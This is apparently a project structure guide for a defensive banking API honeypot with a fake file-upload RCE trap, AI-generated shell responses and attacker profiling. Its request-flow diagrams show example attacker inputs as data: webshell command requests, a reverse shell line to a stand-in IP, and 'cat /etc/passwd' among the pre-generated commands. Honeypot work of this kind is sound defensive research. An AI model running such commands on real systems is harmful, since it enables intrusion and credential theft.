# Project Structure Guide

## Overview

**Maze Myth** is a production-ready, dynamic banking API honeypot with three deception layers:

1. **Dynamic API Maze** — AI-generated banking endpoints with unique randomized data on every request, infinite path generation, and 10+ bait file formats with tracking beacons
2. **CVE-2020-36179 Trap** — Fake file upload RCE simulating a vulnerable Spring/PHP banking portal; accepts real webshell payloads, responds with Gemini-generated terminal output including dynamic directory listings and PHP source code
3. **Attacker Intelligence Engine** — Per-IP behavioral profiling: geo lookup, attack phase machine (IDLE→RECON→EXPLOIT→POST_EXPLOIT→LATERAL), 25+ command risk patterns, 18 file payload tags, engagement scoring, and deception strategy advisor

**Production readiness:**
- **Docker + Gunicorn** deployment with multi-stage build, non-root user, health checks, and named volumes
- **SQLite (WAL mode)** — replaced TinyDB; thread-safe for multi-worker Gunicorn deployments
- **Dual-write audit logging** — Base64-encoded flat file + queryable SQLite `logs` table

---

## Directory Tree

```
Maze-Myth-Dynamic-Honeypot/
│
├── honeypot.py                    ← Main Flask app (~1050 lines)
│                                     • All API routes (fixed + dynamic catch-all)
│                                     • EncodedFileHandler: Base64-encodes every log line
│                                     • SQLiteLogHandler: writes plain-text to SQLite logs table
│                                     • Gunicorn-compatible WSGI entry point
│
├── requirements.txt               ← Python packages
├── run_honeypot.bat               ← Windows: double-click to start both services
├── setup_honeypot.py              ← Creates runtime folders on first run
├── README.md                      ← Project overview + architecture + all flow diagrams
├── DEPLOYMENT.md                  ← Docker / VPS deployment guide
├── ATTACK_GUIDE.md                ← Red-team guide: how to trigger all traps
├── SECURITY.md                    ← Security notes and isolation requirements
├── LICENSE
├── .env.template                  ← Copy to .env and add your API key
├── .env                           ← GEMINI_API_KEY, LLM_MODEL, HONEYPOT_URL (gitignored)
│
├── docker/
│   ├── Dockerfile                 ← Multi-stage build
│   │                                 builder: compiles C extensions (gcc, libffi, libssl)
│   │                                 base:    minimal Python 3.11-slim runtime + non-root user
│   │                                 honeypot target: Gunicorn (4 workers × 2 threads, 120s timeout)
│   │                                 dashboard target: Gunicorn (2 workers, 60s timeout)
│   ├── docker-compose.yaml        ← Production launch
│   │                                 Named volumes: honeypot-logs, honeypot-db, honeypot-files
│   │                                 Dashboard mounts volumes :ro (read-only isolation)
│   │                                 Health checks on both services
│   │                                 restart: unless-stopped
│   └── .dockerignore
│
├── .github/workflows/
│   └── docker-publish.yml         ← CI: auto-build & push to GHCR
│
├── Dataset/                       ← Model data (gitignored)
│   ├── shell_rag.pkl              ← Cowrie-trained command→response model
│   └── ai_cmd_cache.json          ← Pre-generated command responses
│
├── src/
│   │
│   ├── file_upload_rce.py         ← CVE-2020-36179 deception module ⭐
│   │                                 • Spring + PHP upload portals with deceptive headers
│   │                                 • 13-pattern webshell detection
│   │                                 • 18-tag file analysis (threat level + extension risk)
│   │                                 • _shell_registry: filenames in memory only — NO disk writes
│   │                                 • Webshell execution delegates to shell_rag_loader
│   │                                 • Intel API routes: /api/dashboard/cve/file-upload/*
│   │
│   ├── attacker_intel.py          ← Attacker behaviour profiling engine ⭐
│   │                                 • In-memory per-IP AttackerSession objects
│   │                                 • Phase machine: IDLE→RECON→EXPLOIT→POST_EXPLOIT→LATERAL
│   │                                 • 25+ command risk patterns (risk 0–100, phase label)
│   │                                 • 18 byte-regex file payload tags
│   │                                 • IP geolocation (ip-api.com, no API key needed)
│   │                                 • Engagement scoring (weighted by event type)
│   │                                 • Deception strategy advisor (phase-aware hints)
│   │
│   ├── api_generator/
│   │   ├── maze_generator.py      ← Endpoint validity checker
│   │   │                             Access levels: public / user / admin (path-based)
│   │   │                             Breadcrumb hints embedded in responses
│   │   │                             API structure defined inline (no external JSON file)
│   │   └── http_responses.py      ← 401 / 403 / 404 / 500 banking error templates
│   │
│   ├── data_generator/
│   │   └── banking_data.py        ← BankingDataGenerator
│   │                                 Faker + random → unique data per request
│   │                                 Companies, accounts, transactions, payments,
│   │                                 users, merchants, terminals, secrets
│   │                                 If llm enabled: AI-enriched content available
│   │
│   ├── file_generator/
│   │   ├── generator.py           ← PDF (ReportLab), Excel/XLSX (openpyxl)
│   │   │                             Beacon URL in PDF footer / Excel hyperlink
│   │   ├── multi_format_gen.py    ← XML (<beacon> tag), CSV (URL column),
│   │   │                             JSON (_beacon_url field), JavaScript (fetch() call)
│   │   ├── sqlite_gen.py          ← .db / .sqlite with _tracking table row
│   │   └── txt_gen.py             ← Credential .txt with beacon URL at bottom
│   │
│   ├── llm/
│   │   └── llm_integration.py     ← LLMGenerator (Google Gemini)
│   │                                 generate_api_response()     — banking JSON for unknown paths
│   │                                 generate_endpoint_description() — Swagger/OpenAPI docs
│   │                                 generate_file_content()     — PDF/Excel/env bait content
│   │                                 generate_structured_data() — JSON/CSV/XML/SQL/JS helper
│   │                                 Auto-loads API key from .env or .env.template
│   │                                 Model: LLM_MODEL env var (default: gemini-2.5-flash)
│   │
│   ├── rag/
│   │   ├── rag_loader.py          ← Banking domain RAG context for API response prompts
│   │   ├── shell_rag_loader.py    ← 6-step hybrid shell command engine ⭐
│   │   │                             • Gemini LLM is primary (called first, not last)
│   │   │                             • Generates AI directory listings (ls <dir>)
│   │   │                             • Generates PHP banking source code (cat *.php)
│   │   │                             • Generates realistic config/env file contents
│   │   │                             • Startup: batch Gemini call pre-generates 58 ground-truth responses
│   │   │                             • Fake server identity: hostname, IP, CWD, DB creds
│   │   │                             • Reverse shell: 1.5–3s delay + random failure message
│   │   └── shell_rag.pkl          ← Cowrie-trained fallback model (symlink/copy from Dataset/)
│   │
│   └── state/
│       ├── state_manager.py       ← SQLite persistence (WAL mode)
│       │                             Replaced TinyDB — thread-safe per-connection (threading.local)
│       │                             5 tables: endpoints, beacons, downloads, objects, logs
│       │                             90-day auto-retention on startup
│       │                             log_entry(), log_download(), get_downloads(), etc.
│       └── schema.sql             ← Table definitions (reference only — _init_schema() creates them)
│
├── dashboard/
│   ├── index.html                 ← Dashboard UI (port 8002) — polls every ~3s
│   └── monitor.py                 ← Flask backend; Gunicorn-compatible
│                                     /api/activity, /api/new, /api/stats,
│                                     /api/downloads, /api/sensitive
│
├── docs/
│   ├── PROJECT_STRUCTURE.md       ← This file
│   ├── FILE_STRUCTURE_GUIDE.md    ← Per-file explanations + "which file to edit" table
│   └── AUDIT_LOGS_GUIDE.md        ← How to read, decode, and query audit logs
│
├── databases/                     ← Runtime state (gitignored)
│   └── honeypot.db                ← SQLite (WAL mode): endpoints, beacons, downloads, objects, logs
│
├── generated_files/               ← Bait files served to attackers (gitignored)
└── log_files/                     ← Audit log (gitignored)
    └── api_audit.log              ← Base64-encoded structured log (one line per event)
```

---

## How a Request Flows Through the System

### API Maze (port 8001)

```
Attacker hits any URL
        │
        ▼
honeypot.py receives it
        │
        ├─→ CVE upload routes? (registered first via register_file_upload_routes)
        │       └─→ file_upload_rce.py handles it → see CVE flow below
        │
        ├─→ Fixed route? (e.g. /api/v1/accounts, /api/v2/transactions)
        │       └─→ BankingDataGenerator.generate_*() → unique data every call
        │               └─→ Return JSON response
        │
        ├─→ /download/<filename>?
        │       └─→ FileGenerator creates tracked bait file
        │               └─→ CRITICAL event logged (Base64 file + SQLite logs table)
        │                       └─→ Beacon ID saved to SQLite downloads table
        │
        └─→ Dynamic catch-all (unknown path)
                │
                ├─→ maze_generator assigns access level (public/user/admin)
                │
                ├─→ LLMGenerator.generate_api_response() → realistic banking JSON
                │
                ├─→ 20% chance: FileGenerator creates bait file + beacon
                │
                ├─→ Response saved to SQLite endpoints table
                │       (same URL → same AI response forever)
                │
                └─→ Return JSON + optional _attachments download link
```

### CVE-2020-36179 Upload Trap

```
GET /clientportal/support/attachments.php
        ├─→ attacker_intel.record_form_view(ip)
        └─→ PHP upload form (Apache/2.4.54 + PHP/7.4.33 headers)

POST /clientportal/support/attachments.php  (file=shell.php)
        ├─→ Read ≤512 bytes
        ├─→ _contains_webshell_code() → 13 regex patterns
        ├─→ _analyze_file() → 18 payload tags, threat level, extension risk
        ├─→ attacker_intel.record_upload(ip, filename, bytes, endpoint)
        │       → UPLOAD_SHELL (threat=CRITICAL) or UPLOAD_SAFE
        ├─→ Register filename in _shell_registry (NO disk write)
        └─→ Success page + /uploads/shell.php URL

GET /uploads/shell.php?cmd=ls -la /var/www/html
        ├─→ Guard: filename must be in _shell_registry
        ├─→ attacker_intel.record_webshell_access(ip, cmd, output)
        └─→ shell_rag_loader.resolve_shell_command("ls -la /var/www/html")
                1. Gemini LLM (PRIMARY) → generates AI directory listing with:
                   - Correct timestamps, permissions, file sizes
                   - Context-appropriate PHP files (config.php, index.php, etc.)
                   - www-data ownership
                2. Exact cache (58 ground-truth commands if LLM disabled)
                3. Case-insensitive exact match
                4. Dynamic handler (echo/cd/chmod → silent, revshell → delay + error)
                5. TF-IDF fuzzy (Cowrie dataset, threshold 0.85)
                6. Fallback: "bash: ls: command not found"

GET /uploads/shell.php?cmd=cat config.php
        └─→ Gemini generates realistic PHP banking source code:
                <?php
                $db_host = 'db-primary-1.internal';
                $db_name = 'bankcorp_prod';
                $db_user = 'bankcorp_app';
                $db_pass = 'Bc0rp!Pr0d#2024';
                ...

GET /uploads/shell.php?cmd=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
        ├─→ _dynamic() detects reverse shell pattern
        ├─→ time.sleep(random.uniform(1.5, 3.0))  ← realistic delay
        └─→ Random failure: "bash: connect: Connection timed out"
               or "connect: Connection refused"
               or "" (firewall drop — silent)
```

### Gemini AI — Startup Bootstrapping

```
On shell_rag_loader.init():
        │
        └─→ If Gemini enabled:
                └─→ Single batch API call to Gemini:
                        "Generate exact terminal output for [58 commands]:
                         whoami, id, ls, ls -la, cat /etc/passwd,
                         ifconfig, env, netstat -tulpn, ps aux, ..."
                        
                        Context injected:
                        hostname: bankcorpweb-02.internal
                        ip: 10.0.1.52
                        cwd: /var/www/html/clientportal/support
                        db_host: db-primary-1.internal
                        
                        Result: server-specific, contextually correct responses
                        Stored in _cache (ground-truth, overrides pkl/json data)
```

### Dual-Write Logging

```
Any logger.info / logger.warning / logger.critical call in honeypot.py
        │
        ├─→ EncodedFileHandler
        │       │  base64.b64encode(msg.encode('utf-8'))
        │       └─→ log_files/api_audit.log  ← one Base64 line per event
        │
        ├─→ SQLiteLogHandler  
        │       │  _extract_event(msg) → "FILE_DOWNLOAD" / "BEACON_ACTIVATED" / etc.
        │       │  _extract_ip(msg)    → attacker IPv4 address
        │       └─→ databases/honeypot.db → logs table (level, event, ip, message)
        │
        └─→ StreamHandler → Console (plain text, color-coded by level)

Decode a log line:
        python -c "import base64; print(base64.b64decode('<line>').decode())"

Query SQLite logs:
        sqlite3 databases/honeypot.db "SELECT * FROM logs WHERE level='CRITICAL' LIMIT 10"
```

---

## SQLite Database — Table Reference

| Table | Purpose | Key columns |
|-------|---------|-------------|
| `endpoints` | AI response cache per `(path, method)` — unique constraint | `path`, `method`, `response_template`, `access_count` |
| `beacons` | Bait file tokens | `beacon_id`, `file_type`, `client_ip`, `accessed_at`, `access_count` |
| `downloads` | File download events | `filename`, `client_ip`, `user_agent`, `is_sensitive` |
| `objects` | Typed fake objects | `type`, `object_id`, `data` (JSON blob) |
| `logs` | Structured audit log | `level`, `event`, `message`, `client_ip`, `timestamp` |

All tables use integer primary keys, indexed by IP and timestamp. WAL mode + `PRAGMA synchronous=NORMAL`.

---

## Ports

| Port | Service | Audience |
|------|---------|----------|
| **8001** | Honeypot API + CVE traps | **Attackers** — expose this to the internet |
| **8002** | Monitoring Dashboard | **Operators only** — never expose |

---

## Environment Variables

```ini
# .env  (copy from .env.template)
GEMINI_API_KEY=AIzaSy...your-key-here...
HONEYPOT_URL=http://localhost:8001
LLM_MODEL=gemini-2.5-flash
```

---

## Running the System

### Docker (production — recommended)
```bash
cp .env.template .env
# Edit .env: GEMINI_API_KEY=your_key
docker compose -f docker/docker-compose.yaml up -d
```
Both services start with Gunicorn, health checks, and named volumes.

### Windows (one click)
```cmd
run_honeypot.bat
```

### Manual
```bash
# Terminal 1 — Honeypot
python honeypot.py

# Terminal 2 — Dashboard
python dashboard/monitor.py
```
